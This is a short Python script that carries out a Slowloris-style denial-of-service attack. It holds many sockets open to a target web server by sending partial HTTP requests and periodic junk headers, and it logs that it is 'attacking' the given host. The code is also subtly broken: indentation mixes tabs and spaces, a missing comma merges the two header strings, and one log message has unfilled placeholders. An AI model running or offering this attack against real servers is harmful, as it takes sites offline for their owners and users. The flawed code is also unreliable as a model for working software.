import socket
import random
import time
import sys

log_level = 2

def log(txt, level=1):
	if log_level >= level:
		print(txt)


list_of_sockets = []

regular_headers = [
"User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101"
"Accept-language: en-US,en,q=0.5"
]

def init_socket(ip):
        try:
            #print("Creating socket...")
            conn = socket.socket()
	    conn.settimeout(4)
	    conn.connect((ip,80))
            #print("Created socket..")

	    conn.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
	    for header in regular_headers:
	   	conn.send("{}\r\n".format(header).encode("utf-8"))
	    return conn
        except:
            print("Socket creation error..!!")

def main():
	if len(sys.argv) != 2:
		print("USAGE: {} example.com".format(sys.argv[0]))
		return

	ip = sys.argv[1]
	socket_count = 200
	log("Attacking {} with {} sockets.".format(ip, socket_count))

	log("Creating sockets...")
	for i in range(socket_count):
		try:
			log("Creating socket nr {}".format(i), level=2)
			s=init_socket(ip)
		except socket.error:
			break
		list_of_sockets.append(s)


	while True:
		log("Sending keep-alive headers ... Socket count {} ")
		for s in list(list_of_sockets):
			try:
				s.send("X-a: {}\r\n".format(random.randint(0, 5000)).encode("utf-8"))
			except socket.error:
				list_of_sockets.remove(s)

		for _ in range(socket_count - len(list_of_sockets)):
			log("Recreating socket...")

			try:
				s = init_socket(ip)
				if s:
					list_of_sockets.append(s)
			except socket.error:
				break
		time.sleep(15)


if __name__ == '__main__':
	main()


